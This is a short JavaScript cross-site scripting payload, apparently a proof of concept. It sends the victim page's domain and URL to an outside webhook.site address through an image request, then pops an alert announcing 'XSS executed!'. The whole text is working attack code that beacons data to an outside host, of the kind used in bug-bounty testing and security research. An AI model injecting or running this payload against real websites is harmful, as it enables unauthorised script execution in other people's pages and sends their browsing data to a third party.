
new Image().src =
  'https://webhook.site/15524a9b-7e50-4fa2-aa60-3b61dbd603f3/hit?d=' +
  encodeURIComponent(document.domain) +
  '&url=' + encodeURIComponent(location.href);

alert(
  'XSS executed!\n\nDomain: ' + document.domain +
  '\nURL: ' + location.href
);
